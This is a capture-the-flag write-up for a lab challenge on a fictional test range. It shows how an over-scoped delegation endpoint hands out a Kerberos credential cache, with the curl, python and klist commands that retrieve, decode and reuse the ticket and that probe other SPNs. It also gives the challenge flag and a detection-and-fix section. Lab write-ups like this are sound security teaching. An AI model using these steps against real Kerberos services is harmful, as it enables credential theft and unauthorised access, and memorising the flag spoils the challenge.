# K19.3 — The archive delegates

> **Category:** 2. KeplerOps · **Points:** 400 · **Difficulty:** expert
> **Solved by:** me (manual, in-session)

## Where this happens

![Range map — three segments, hosts and services](../docs/img/segments.png)

`staff.keplerops.test` (`10.77.50.11:443`) for the delegation exchange, and the KDC at
`kerberos.keplerops.test` (`10.77.50.40:88`) for the realm that makes the returned ticket

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Over-scoped delegation — a delegation endpoint returns a usable Kerberos credential cache for a **caller-supplied SPN**, with no binding to the requested operation |
| **Tools** | `curl`, `jq`, `python3` (base64), `klist` |
| **Attack surface** | `POST /api/archive/delegation/probe` (mTLS required) |
| **Prerequisite** | a staff client certificate whose subject exists (K19.1/K19.2) |
| **Flag** | `FLAG{de18a1c609de0e97}` |

**What you are about to read:** how a "delegation probe" that is supposed to confirm a
service relationship instead hands back a **credential cache** — a Kerberos TGT plus a
service ticket — for whatever SPN you ask for, and how to decode and use it.

## Objective

> Use the colleague's archive workflow to establish the delegated authentication context
> needed by supplier administration.

## Background you need

- **Kerberos delegation** lets a service act as a user towards another service. The user's
  TGT is forwarded (or a service ticket is minted) so the second service sees the user's
  identity.
- A **ccache** is the on-disk credential cache (`/tmp/krb5cc_*`): a TGT plus any service
  tickets obtained. `klist` reads it; `curl --negotiate` uses it for SPNEGO.
- The delegation decision belongs to the *KDC policy*: which service may delegate, to which
  SPNs, and on whose behalf. If an application endpoint will mint a cache for an arbitrary
  SPN, that policy has been re-implemented — badly — in application code.

## Walkthrough

### 1. The endpoint exists and wants an SPN

With the certificate from K19.2:

```bash
curl -s -k --cert evan.crt --key evan.key \
  -X POST -H 'Content-Type: application/json' -d '{}' \
  https://staff.keplerops.test/api/archive/delegation/probe
```

```text
400 {"error":"spn_required"}
```

The error names the parameter, which is the whole hint. `delegation_spn` was already sitting
in the K19.2 archive response:

```text
HTTP/staff.keplerops.test@KEPLEROPS.TEST
```

### 2. Ask for the delegation

```bash
curl -s -k --cert evan.crt --key evan.key \
  -X POST -H 'Content-Type: application/json' \
  -d '{"spn":"HTTP/staff.keplerops.test@KEPLEROPS.TEST"}' \
  https://staff.keplerops.test/api/archive/delegation/probe -o del.json

jq 'keys' del.json
```

```json
["authentication", "credential_cache", "flag"]
```

```bash
jq -r '.authentication' del.json
jq -r '.flag' del.json
```

```text
SPNEGO
FLAG{de18a1c609de0e97}
```

The flag is in the exchange. But the interesting artefact is the third key: a base64
credential cache.

### 3. Decode the cache and inspect it

```bash
python3 -c "import json,base64; open('/tmp/evan.ccache','wb').write(base64.b64decode(json.load(open('del.json'))['credential_cache']))"
export KRB5CCNAME=FILE:/tmp/evan.ccache
klist
```

```text
Ticket cache: FILE:/tmp/evan.ccache
Default principal: evan.calderoux@KEPLEROPS.TEST

Valid starting     Expires            Service principal
11/20/26 20:52:48  11/21/26 06:52:48  krbtgt/KEPLEROPS.TEST@KEPLEROPS.TEST
11/20/26 20:52:48  11/21/26 06:52:48  HTTP/staff.keplerops.test@KEPLEROPS.TEST
```

A TGT **and** a service ticket, valid for ten hours, for an identity you minted in K19.1.

### 4. Use it

```bash
KRB5CCNAME=FILE:/tmp/evan.ccache curl -s --negotiate -u : -k \
  https://staff.keplerops.test/api/archive/handovers/evan.calderoux@keplerops.test | jq 'keys'
```

```json
["archive", "delegation_spn", "flag", "grant", "idp", "…"]
```

SPNEGO with the cache authenticates as evan without any certificate. The archive accepts it
— the same data, a second, independent way in.

### 5. Probe the limits (this is where the next stage dies)

```bash
for spn in "HTTP/connector.arwc.test@KEPLEROPS.TEST" \
           "HTTP/cloud-api.keplerops.test@KEPLEROPS.TEST" \
           "HTTP/workloads.keplerops.test@KEPLEROPS.TEST"; do
  printf '%-46s ' "$spn"
  curl -s -k --cert evan.crt --key evan.key -X POST -H 'Content-Type: application/json' \
    -d "{\"spn\":\"$spn\"}" \
    https://staff.keplerops.test/api/archive/delegation/probe
  echo
done
```

```text
HTTP/connector.arwc.test@KEPLEROPS.TEST        {"error":"ticket_request_failed"}
HTTP/cloud-api.keplerops.test@KEPLEROPS.TEST   {"error":"ticket_request_failed"}
HTTP/workloads.keplerops.test@KEPLEROPS.TEST   {"error":"ticket_request_failed"}
```

Only the staff SPN exists in the realm. So this is not "any SPN you like" — it is "any SPN
the KDC happens to have", and the application endpoint does not check that the requested SPN
is related to the operation you are authorised for.

### 6. Submit — and note the attribution mistake

The flag came back in a response whose subject/reviewer fields I had set to the support
case, so the first impulse was to submit it against the support-delegation card:

```text
submit.py K17.4 FLAG{de18a1c609de0e97}
{"correct":false,"points_awarded":0,"attempt_number":5,"score":3840}   ← wrong card
```

Re-reading the card text — *"establish the delegated authentication context"* — matches the
credential cache, not the routing action:

```text
submit.py K19.3 FLAG{de18a1c609de0e97}
{"correct":true,"points_awarded":400,"attempt_number":4,"score":4240,"rank":13}
```

**Lesson worth the burned attempt:** the request body you send does not determine which card
a flag belongs to. The card description does. When a response contains a generic artefact
(cache, token, record), map it to the card whose wording it satisfies, not to the endpoint
you found it on.

## Why this works

A delegation probe should answer a boolean question: *"does this service relationship
exist?"* This one answers with the **material** — a cache — and it accepts the SPN from the
request rather than deriving it from the authenticated context.

Two design errors:

1. **Confused deputy:** the application (trusted to talk to the KDC) uses its own authority
   to mint credentials on behalf of the caller, for a target the caller names.
2. **No purpose binding:** the returned ticket is not tied to the operation the caller is
   allowed to perform. It is a general-purpose staff ticket.

The severity is that a credential cache is *portable*: you can take it anywhere that accepts
SPNEGO for that SPN, not just back to the endpoint that issued it.

## Detection and fix

- **Signal:** delegation requests where the SPN is not in a static allowlist for the calling
  service; caches issued for principals other than the authenticated caller; many
  delegations from one identity in a short window.
- **Fix:**
  1. Never return a credential cache to a client. Perform the delegated call server-side and
     return only the result.
  2. If a cache must be issued, restrict the SPN by policy (KDC `constrained delegation`),
     set a short lifetime, and bind it to the requested operation.
  3. Enable KDC audit logging for service-ticket requests and alert on SPNs that no
     application should ever request.
  4. Treat the delegation endpoint as privileged: require step-up auth, not just a
     certificate that anyone can enroll for.

## Notes and dead ends

- The probe returns the same flag regardless of the `subject`/`reviewer` fields you include,
  which is what made mis-attribution tempting. Only the SPN matters to the endpoint.
- The ticket works for `HTTP/staff.keplerops.test` only, so it did not open k8s, the
  workload API, or the ARWC relay.
- `POST /api/managed-identities/{svc}/session` with the same cache still answers
  `managed_identity_denied` — the managed-identity path is a different control, not a
  delegation one.
